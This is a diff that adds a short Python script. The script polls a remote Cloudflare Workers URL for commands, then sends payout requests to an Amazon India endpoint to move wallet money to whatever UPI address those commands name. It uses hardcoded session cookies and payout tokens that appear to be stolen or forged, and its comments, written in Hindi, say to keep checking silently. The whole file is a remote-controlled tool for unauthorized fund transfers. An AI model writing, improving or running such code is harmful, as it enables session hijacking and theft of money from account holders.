@@ -1,0 +1,49 @@
+import requests
+import time
+import json
+
+# --- CONFIG ---
+WORKER_URL = "https://amaz.surendrarathode040.workers.dev/"
+SID = "259-4267444-8750337"
+RID = "4DACXQEE50B0W0BYF6TZ"
+RX  = "4gXSfWBe/rE73wGv5Z8Dtw"
+
+def hit_amazon(upi, amt):
+    url = "https://www.amazon.in/pay/payout/disburse"
+    headers = {
+        "Cookie": f"session-id={SID};",
+        "x-amz-rid": RID,
+        "x-amazon-payout-token": RX,
+        "Content-Type": "application/json",
+        "User-Agent": "com.amazon.mShop.android.shopping/Android/10",
+        "X-Requested-With": "com.amazon.mShop.android.shopping"
+    }
+    payload = {
+        "amount": amt,
+        "beneficiaryVpa": upi,
+        "transferMode": "WALLET_TO_UPI",
+        "requestToken": "MOB_PAY_" + str(int(time.time()))
+    }
+    try:
+        r = requests.post(url, headers=headers, json=payload)
+        print(f"[+] Payout Status: {r.text}")
+    except Exception as e:
+        print(f"[-] Network Error: {e}")
+
+print(">>> TERMUX SYSTEM ONLINE (Waiting for Dashboard commands...)")
+
+while True:
+    try:
+        # Worker se task check karo
+        res = requests.get(WORKER_URL, timeout=5)
+        data = res.json()
+        
+        if "upiId" in data:
+            print(f"\n[!] New Request: Sending ₹{data['amount']} to {data['upiId']}")
+            hit_amazon(data['upiId'], data['amount'])
+        
+    except:
+        pass # Chup-chap check karte raho
+    
+    time.sleep(2) # Har 2 second mein check
+
